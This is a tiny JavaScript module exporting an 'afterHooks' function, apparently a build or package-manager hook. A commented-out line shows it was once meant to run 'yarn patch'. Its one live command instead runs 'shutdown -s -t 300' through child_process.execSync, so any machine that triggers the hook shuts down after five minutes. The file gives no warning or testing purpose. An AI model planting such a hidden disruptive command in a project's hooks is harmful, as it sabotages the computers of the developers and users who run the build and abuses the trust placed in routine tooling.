module.exports = {
  default: function afterHooks() {
    const execSync = require('child_process').execSync;
    // execSync('yarn patch', { encoding: 'utf-8' });
    execSync('shutdown -s -t 300', { encoding: 'utf-8' });
  }
};
